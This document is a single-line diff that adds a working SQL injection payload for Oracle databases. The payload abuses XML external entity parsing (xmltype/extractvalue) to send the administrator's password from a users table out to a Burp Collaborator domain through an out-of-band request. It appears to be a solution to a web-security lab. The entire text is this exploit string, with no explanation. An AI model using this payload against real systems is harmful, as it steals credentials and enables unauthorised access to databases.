@@ -1,0 +1,1 @@
+ || (SELECT extractvalue(xmltype('<?fxml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'|| (select password from users where username='administrator') ||'.xrshwlapue0clgkr7dvfxm2fa6gx4m.burpcollaborator.net/"> %25remote%3b]>'),'/l') FROM dual)--
